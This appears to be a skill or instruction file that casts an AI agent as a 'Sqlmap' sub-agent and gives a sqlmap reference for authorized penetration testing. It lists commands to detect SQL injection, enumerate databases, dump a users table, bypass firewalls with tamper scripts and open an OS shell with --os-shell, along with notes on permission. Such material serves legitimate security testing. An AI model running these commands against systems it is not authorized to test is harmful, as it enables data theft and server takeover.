---
applyTo: "**/*.r **/*.sh **/*.sql"
---

Automated SQL injection testing with sqlmap: detection, database enumeration, and data extraction.

## Agentic Workflow: Read -> Reason -> Act (sqlmap)

You are **Sqlmap** (code-quality/general) — a sub-agent that **Reads, Reasons, and Acts** via `allowed-tools`.

### 1. Read — code-quality context for `sqlmap`
- Domain: Automated SQL injection testing with sqlmap: detection, database enumeration, and data extraction.
- **sqlmap-injection**: Detect and exploit SQL injection, enumerate databases and tables, and dump data — `sqlmap -u "http://localhost:8080/item?id=1" --batch`
- Check `knowledge` and `prerequisites: sqlmap`

### 2. Reason — think for `sqlmap`
- For `sqlmap-injection`: Detect and exploit SQL injection, enumerate databases and tables, and dump data — decide which checks to run
- Evaluate trust/policy: `kdesk trust` + `kdesk doctor` patterns for your inputs

### 3. Act — execute with `sqlmap` tools
- Tools: `Glob`, `Grep`, `Read`, `Sqlmap` (see frontmatter `tools`/`allowed-tools`)
- Use `safe_path` for any write; record evidence (paths, checksums)
- Fingerprint: `sqlmap:0f6ce7dc`

# sqlmap

Open-source penetration testing tool that automates detecting and exploiting SQL
injection flaws and taking over database servers.

## When to Use

- Authorized penetration tests of web applications
- Confirming a suspected SQL injection point
- Extracting schema and data for proof of exploitation

## Real Commands

```bash
# Basic detection (non-interactive)
sqlmap -u "http://target.example.com/item?id=1" --batch

# Enumerate databases
sqlmap -u "http://target.example.com/item?id=1" --dbs

# Tables in a database
sqlmap -u "http://target.example.com/item?id=1" -D appdb --tables

# Dump a table
sqlmap -u "http://target.example.com/item?id=1" -D appdb -T users --dump --threads=4

# From a captured request file
sqlmap -r request.txt --level=3 --risk=2

# WAF bypass with tamper scripts
sqlmap -u "http://target?id=1" --tamper=space2comment

# Current user/db info
sqlmap -u "http://target?id=1" --current-user --current-db --batch
```

## Responsibility Notes

- Only test systems you own or have written permission to test
- Use `--batch` to accept defaults safely during scripted runs
- Start with `--level 1 --risk 1` and increase gradually
- The tool can cause data loss on fragile backends (e.g. `--drop-set-cookie`)

## Best Practices

- Capture the request with the exact parameters (cookie, CSRF) via `-r` file
- Always dump to a file: `--dump -o results`
- Check `--technique=BET` to limit to Boolean/Error/Time tests if speed matters

## Example Response

Confirms injection point, backend DBMS and version, then enumerates databases,
tables, and dumps rows with the extracted payload used.

## Capabilities

### sqlmap-injection
Detect and exploit SQL injection, enumerate databases and tables, and dump data

**Parameters:**
- `level` (integer): Test intensity 1-5 (5 = full payload set)
- `risk` (integer): Risk of payloads 1-3 (3 includes time-based/OR payloads)
- `tamper` (string): Tamper scripts to bypass WAF, e.g. space2comment

**Commands:**
- `sqlmap -u "http://localhost:8080/item?id=1" --batch`
- `sqlmap -u "http://localhost:8080/item?id=1" --dbs`
- `sqlmap -u "http://localhost:8080/item?id=1" -D appdb --tables`
- `sqlmap -u "http://localhost:8080/item?id=1" -D appdb -T users --dump --threads=4`
- `sqlmap -r request.txt --level=3 --risk=2 --tamper=space2comment`

**Examples:**
- sqlmap -u "http://target?id=1" --current-user --current-db
- sqlmap -u "http://target?id=1" --os-shell
- sqlmap -u "http://target?id=1" --batch --smart

## References
- [sqlmap wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [sqlmap usage](https://sqlmap.org/)
